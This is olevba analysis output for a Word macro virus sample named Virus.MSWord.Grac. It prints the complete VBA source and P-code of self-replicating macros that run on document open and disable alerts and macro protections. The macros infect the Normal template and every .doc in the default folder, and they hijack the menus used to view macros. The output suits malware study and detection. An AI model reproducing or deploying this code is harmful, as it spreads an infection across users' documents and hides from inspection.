olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Grac
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Grac - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO fotografia.frm 
in file: Virus.MSWord.Grac - OLE stream: 'Macros/VBA/fotografia'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




Private Sub UserForm_MouseMove(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    mover
End Sub

Private Sub UserForm_Terminate()
    fotografia.Caption = "Soy toda tuya!"
    fotografia.Show
End Sub

Sub mover()
    fotografia.Top = Rnd * 100 + Rnd * 100 + Rnd * 100 + Rnd * 100 + Rnd * 100
    fotografia.Left = Rnd * 100 + Rnd * 100 + Rnd * 100 + Rnd * 100 + Rnd * 100 + _
                    Rnd * 100 + Rnd * 100 + Rnd * 50
End Sub


-------------------------------------------------------------------------------
VBA MACRO graciela.bas 
in file: Virus.MSWord.Grac - OLE stream: 'Macros/VBA/graciela'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim cheleado As Boolean, architmp As String

Sub AutoOpen()
    On Error Resume Next
    desactivar_todo
    no_me_veras_ok
    copiar_me
    cerrar_plantilla
    mostrar_graciela
End Sub

Sub desactivar_todo()
    On Error Resume Next
    Application.EnableCancelKey = 0
    Application.DisplayAlerts = 0
    WordBasic.DisableAutoMacros False
End Sub

Sub copiar_me()
    On Error Resume Next
    Dim ya As Boolean, dirtmp As String
    dirtmp = Options.DefaultFilePath(0)
    architmp = ActiveDocument.FullName
    With Application.FileSearch
        .NewSearch
        .LookIn = Options.DefaultFilePath(8)
        .FileName = "graciela.src"
        .MatchTextExactly = False
        If .Execute > 0 Then
            For i = 1 To .FoundFiles.Count
                    ya = True
            Next i
        End If
    End With
    If ya = False Then
        With ActiveDocument
            .SaveAs FileName:=Options.DefaultFilePath(8) & "\graciela.src", _
                            FileFormat:=wdFormatTemplate, _
                            AddToRecentFiles:=False
        End With
        copiar_items (NormalTemplate.FullName)
        reproducir_me (dirtmp)
    End If
End Sub

Sub reproducir_me(direc As String)
    On Error Resume Next
    With Application.FileSearch
        .NewSearch
        .LookIn = direc
        .SearchSubFolders = False
        .FileName = "*.doc"
        .MatchTextExactly = False
        .FileType = 3
        If .Execute > 0 Then
            For i = 1 To .FoundFiles.Count
                If ActiveDocument.FullName <> .FoundFiles(i) Then
                    copiar_items (.FoundFiles(i))
                End If
            Next i
        End If
    End With
End Sub

Sub copiar_items(archivo As String)
    On Error Resume Next
    Dim nmak(1) As String, NT As Object
    Dim aSrc$
    Dim aDes As Variant
    aDes = archivo
    nmak(0) = "fotografia"
    nmak(1) = "graciela"
    aSrc = Options.DefaultFilePath(8) & "\graciela.src"
    checar aDes
    If chelado = False Then fotocopiar aSrc, aDes, nmak
    ActiveDocument.Save
End Sub

Public Sub fotocopiar(Sfile, Dfile, nmak)
    On Error Resume Next
    Dim aNmak
    For Each aNmak In nmak
        On Error Resume Next
        Application.OrganizerCopy Sfile, Dfile, aNmak, 3
    Next
End Sub

Sub cerrar_plantilla()
    On Error Resume Next
    If ActiveDocument.Name = "graciela.src" Then
        Documents.Open architmp, False, False, False, "", "", False, "", "", 0
        Windows("graciela.src").Close
    End If
End Sub

Sub checar(Sfile)
    Dim nmak As Object, foto As Boolean, chela As Boolean
    cheleado = False
    For Each nmak In Sfile.VBProject.VBComponents
        If nmak.Name = "fotografia" Then foto = True
        If nmak.Name = "graciela" Then chela = True
    Next nmak
    If (foto And chela) Then cheleado = True
End Sub

Sub no_me_veras_ok()
    On Error Resume Next
    CommandBars("Macro").Controls(1).OnAction = "ViewVbCode"
    CommandBars("Macro").Controls(2).OnAction = "ViewVbCode"
    CommandBars("Visual Basic").Controls(1).OnAction = "ViewVbCode"
    CommandBars("Visual Basic").Controls(2).OnAction = "ViewVbCode"
End Sub

Sub ToolsMacro()
    ViewVBcode
End Sub

Sub ViewVBcode()
    On Error Resume Next
    If MsgBox("Me quieres ver desnuda?", vbExclamation + vbYesNo, "Chela") = vbYes Then
        SendKeys "%m%s%b~%dAtrevido...%m"
    Else
        SendKeys "tu te lo pierdes..."
    End If
End Sub

Sub mostrar_graciela()
    On Error Resume Next
    Dim hoy As Integer
    hoy = Day(Now())
    If (hoy = 5) Or _
       (hoy = 12) Or _
       (hoy = 19) Or _
       (hoy = 26) Then
            fotografia.Show
    End If
End Sub

Sub FileOpen()
    On Error Resume Next
    mostrar_graciela
    Dialogs(80).Show
    copiar_items (ActiveDocument.FullName)
End Sub

Sub FileSaveAS()
    On Error Resume Next
    Dialogs(84).Show
    FileSave
End Sub

Sub FileSave()
    On Error Resume Next
    ActiveDocument.Save
    copiar_items (ActiveDocument.FullName)
    mostrar_graciela
End Sub



-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Grac
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/fotografia - 2163 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' 	FuncDefn (Private Sub UserForm_MouseMove(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single))
' Line #5:
' 	ArgsCall mover 0x0000 
' Line #6:
' 	EndSub 
' Line #7:
' Line #8:
' 	FuncDefn (Private Sub UserForm_Terminate())
' Line #9:
' 	LitStr 0x000E "Soy toda tuya!"
' 	Ld fotografia 
' 	MemSt Caption 
' Line #10:
' 	Ld fotografia 
' 	ArgsMemCall Show 0x0000 
' Line #11:
' 	EndSub 
' Line #12:
' Line #13:
' 	FuncDefn (Sub mover())
' Line #14:
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	Add 
' 	Ld fotografia 
' 	MemSt Top 
' Line #15:
' 	LineCont 0x0004 18 00 14 00
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	Add 
' 	Ld fotografia 
' 	MemSt LBound 
' Line #16:
' 	EndSub 
' Line #17:
' Line #18:
' Macros/VBA/graciela - 7962 bytes
' Line #0:
' 	Dim 
' 	VarDefn cheleado (As Boolean)
' 	VarDefn architmp (As String)
' Line #1:
' Line #2:
' 	FuncDefn (Sub AutoOpen())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall desactivar_todo 0x0000 
' Line #5:
' 	ArgsCall no_me_veras_ok 0x0000 
' Line #6:
' 	ArgsCall copiar_me 0x0000 
' Line #7:
' 	ArgsCall cerrar_plantilla 0x0000 
' Line #8:
' 	ArgsCall mostrar_graciela 0x0000 
' Line #9:
' 	EndSub 
' Line #10:
' Line #11:
' 	FuncDefn (Sub desactivar_todo())
' Line #12:
' 	OnError (Resume Next) 
' Line #13:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #14:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #15:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #16:
' 	EndSub 
' Line #17:
' Line #18:
' 	FuncDefn (Sub copiar_me())
' Line #19:
' 	OnError (Resume Next) 
' Line #20:
' 	Dim 
' 	VarDefn ya (As Boolean)
' 	VarDefn dirtmp (As String)
' Line #21:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St dirtmp 
' Line #22:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St architmp 
' Line #23:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #24:
' 	ArgsMemCallWith NewSearch 0x0000 
' Line #25:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	MemStWith LookIn 
' Line #26:
' 	LitStr 0x000C "graciela.src"
' 	MemStWith FileName 
' Line #27:
' 	LitVarSpecial (False)
' 	MemStWith MatchTextExactly 
' Line #28:
' 	MemLdWith Execute 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #29:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	For 
' Line #30:
' 	LitVarSpecial (True)
' 	St ya 
' Line #31:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	EndWith 
' Line #34:
' 	Ld ya 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #35:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #36:
' 	LineCont 0x0008 0D 00 1C 00 11 00 1C 00
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x000D "\graciela.src"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	ArgsMemCallWith SaveAs 0x0003 
' Line #37:
' 	EndWith 
' Line #38:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Paren 
' 	ArgsCall copiar_items 0x0001 
' Line #39:
' 	Ld dirtmp 
' 	Paren 
' 	ArgsCall reproducir_me 0x0001 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	EndSub 
' Line #42:
' Line #43:
' 	FuncDefn (Sub reproducir_me(direc As String))
' Line #44:
' 	OnError (Resume Next) 
' Line #45:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #46:
' 	ArgsMemCallWith NewSearch 0x0000 
' Line #47:
' 	Ld direc 
' 	MemStWith LookIn 
' Line #48:
' 	LitVarSpecial (False)
' 	MemStWith SearchSubFolders 
' Line #49:
' 	LitStr 0x0005 "*.doc"
' 	MemStWith FileName 
' Line #50:
' 	LitVarSpecial (False)
' 	MemStWith MatchTextExactly 
' Line #51:
' 	LitDI2 0x0003 
' 	MemStWith FileType 
' Line #52:
' 	MemLdWith Execute 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #53:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	For 
' Line #54:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld i 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	Ne 
' 	IfBlock 
' Line #55:
' 	Ld i 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	Paren 
' 	ArgsCall copiar_items 0x0001 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #58:
' 	EndIfBlock 
' Line #59:
' 	EndWith 
' Line #60:
' 	EndSub 
' Line #61:
' Line #62:
' 	FuncDefn (Sub copiar_items(archivo As String))
' Line #63:
' 	OnError (Resume Next) 
' Line #64:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0001 
' 	VarDefn nmak (As String)
' 	VarDefn NT (As Object)
' Line #65:
' 	Dim 
' 	VarDefn aSrc
' Line #66:
' 	Dim 
' 	VarDefn aDes (As Variant)
' Line #67:
' 	Ld archivo 
' 	St aDes 
' Line #68:
' 	LitStr 0x000A "fotografia"
' 	LitDI2 0x0000 
' 	ArgsSt nmak 0x0001 
' Line #69:
' 	LitStr 0x0008 "graciela"
' 	LitDI2 0x0001 
' 	ArgsSt nmak 0x0001 
' Line #70:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x000D "\graciela.src"
' 	Concat 
' 	St aSrc 
' Line #71:
' 	Ld aDes 
' 	ArgsCall checar 0x0001 
' Line #72:
' 	Ld chelado 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld aSrc 
' 	Ld aDes 
' 	Ld nmak 
' 	ArgsCall fotocopiar 0x0003 
' 	EndIf 
' Line #73:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #74:
' 	EndSub 
' Line #75:
' Line #76:
' 	FuncDefn (Public Sub fotocopiar(Sfile, Dfile, nmak))
' Line #77:
' 	OnError (Resume Next) 
' Line #78:
' 	Dim 
' 	VarDefn aNmak
' Line #79:
' 	StartForVariable 
' 	Ld aNmak 
' 	EndForVariable 
' 	Ld nmak 
' 	ForEach 
' Line #80:
' 	OnError (Resume Next) 
' Line #81:
' 	Ld Sfile 
' 	Ld Dfile 
' 	Ld aNmak 
' 	LitDI2 0x0003 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #82:
' 	StartForVariable 
' 	Next 
' Line #83:
' 	EndSub 
' Line #84:
' Line #85:
' 	FuncDefn (Sub cerrar_plantilla())
' Line #86:
' 	OnError (Resume Next) 
' Line #87:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x000C "graciela.src"
' 	Eq 
' 	IfBlock 
' Line #88:
' 	Ld architmp 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitVarSpecial (False)
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitDI2 0x0000 
' 	Ld Documents 
' 	ArgsMemCall Option 0x000A 
' Line #89:
' 	LitStr 0x000C "graciela.src"
' 	ArgsLd Windows 0x0001 
' 	ArgsMemCall Close 0x0000 
' Line #90:
' 	EndIfBlock 
' Line #91:
' 	EndSub 
' Line #92:
' Line #93:
' 	FuncDefn (Sub checar(Sfile))
' Line #94:
' 	Dim 
' 	VarDefn nmak (As Object)
' 	VarDefn foto (As Boolean)
' 	VarDefn chela (As Boolean)
' Line #95:
' 	LitVarSpecial (False)
' 	St cheleado 
' Line #96:
' 	StartForVariable 
' 	Ld nmak 
' 	EndForVariable 
' 	Ld Sfile 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #97:
' 	Ld nmak 
' 	MemLd New 
' 	LitStr 0x000A "fotografia"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St foto 
' 	EndIf 
' Line #98:
' 	Ld nmak 
' 	MemLd New 
' 	LitStr 0x0008 "graciela"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St chela 
' 	EndIf 
' Line #99:
' 	StartForVariable 
' 	Ld nmak 
' 	EndForVariable 
' 	NextVar 
' Line #100:
' 	Ld foto 
' 	Ld chela 
' 	And 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St cheleado 
' 	EndIf 
' Line #101:
' 	EndSub 
' Line #102:
' Line #103:
' 	FuncDefn (Sub no_me_veras_ok())
' Line #104:
' 	OnError (Resume Next) 
' Line #105:
' 	LitStr 0x000A "ViewVbCode"
' 	LitDI2 0x0001 
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt OnAction 
' Line #106:
' 	LitStr 0x000A "ViewVbCode"
' 	LitDI2 0x0002 
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt OnAction 
' Line #107:
' 	LitStr 0x000A "ViewVbCode"
' 	LitDI2 0x0001 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt OnAction 
' Line #108:
' 	LitStr 0x000A "ViewVbCode"
' 	LitDI2 0x0002 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt OnAction 
' Line #109:
' 	EndSub 
' Line #110:
' Line #111:
' 	FuncDefn (Sub ToolsMacro())
' Line #112:
' 	ArgsCall ViewVBcode 0x0000 
' Line #113:
' 	EndSub 
' Line #114:
' Line #115:
' 	FuncDefn (Sub ViewVBcode())
' Line #116:
' 	OnError (Resume Next) 
' Line #117:
' 	LitStr 0x0017 "Me quieres ver desnuda?"
' 	Ld vbExclamation 
' 	Ld vbYesNo 
' 	Add 
' 	LitStr 0x0005 "Chela"
' 	ArgsLd MsgBox 0x0003 
' 	Ld vbYes 
' 	Eq 
' 	IfBlock 
' Line #118:
' 	LitStr 0x0016 "%m%s%b~%dAtrevido...%m"
' 	ArgsCall SendKeys 0x0001 
' Line #119:
' 	ElseBlock 
' Line #120:
' 	LitStr 0x0013 "tu te lo pierdes..."
' 	ArgsCall SendKeys 0x0001 
' Line #121:
' 	EndIfBlock 
' Line #122:
' 	EndSub 
' Line #123:
' Line #124:
' 	FuncDefn (Sub mostrar_graciela())
' Line #125:
' 	OnError (Resume Next) 
' Line #126:
' 	Dim 
' 	VarDefn hoy (As Integer)
' Line #127:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	St hoy 
' Line #128:
' 	LineCont 0x000C 07 00 07 00 0D 00 07 00 13 00 07 00
' 	Ld hoy 
' 	LitDI2 0x0005 
' 	Eq 
' 	Paren 
' 	Ld hoy 
' 	LitDI2 0x000C 
' 	Eq 
' 	Paren 
' 	Or 
' 	Ld hoy 
' 	LitDI2 0x0013 
' 	Eq 
' 	Paren 
' 	Or 
' 	Ld hoy 
' 	LitDI2 0x001A 
' 	Eq 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #129:
' 	Ld fotografia 
' 	ArgsMemCall Show 0x0000 
' Line #130:
' 	EndIfBlock 
' Line #131:
' 	EndSub 
' Line #132:
' Line #133:
' 	FuncDefn (Sub FileOpen())
' Line #134:
' 	OnError (Resume Next) 
' Line #135:
' 	ArgsCall mostrar_graciela 0x0000 
' Line #136:
' 	LitDI2 0x0050 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #137:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Paren 
' 	ArgsCall copiar_items 0x0001 
' Line #138:
' 	EndSub 
' Line #139:
' Line #140:
' 	FuncDefn (Sub FileSaveAS())
' Line #141:
' 	OnError (Resume Next) 
' Line #142:
' 	LitDI2 0x0054 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #143:
' 	ArgsCall FileSave 0x0000 
' Line #144:
' 	EndSub 
' Line #145:
' Line #146:
' 	FuncDefn (Sub FileSave())
' Line #147:
' 	OnError (Resume Next) 
' Line #148:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #149:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Paren 
' 	ArgsCall copiar_items 0x0001 
' Line #150:
' 	ArgsCall mostrar_graciela 0x0000 
' Line #151:
' 	EndSub 
' Line #152:
' Line #153:
' Line #154:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |UserForm_MouseMove  |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

